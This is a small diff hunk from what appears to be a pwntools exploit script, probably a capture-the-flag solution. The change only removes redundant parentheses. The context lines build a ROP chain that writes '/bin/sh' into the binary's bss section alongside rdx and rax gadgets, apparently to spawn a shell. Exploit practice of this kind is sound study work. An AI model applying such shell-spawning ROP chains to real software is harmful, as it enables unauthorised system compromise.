@@ -14,7 +14,7 @@ while 'Nope' in res.decode():
     res = io.recvline()
     
 rop = ROP(elf)
-rop.raw((rop.rdx.address))
+rop.raw(rop.rdx.address)
 rop.raw('/bin/sh\x00')
 rop.raw(rop.rax.address)
 rop.raw(elf.bss())
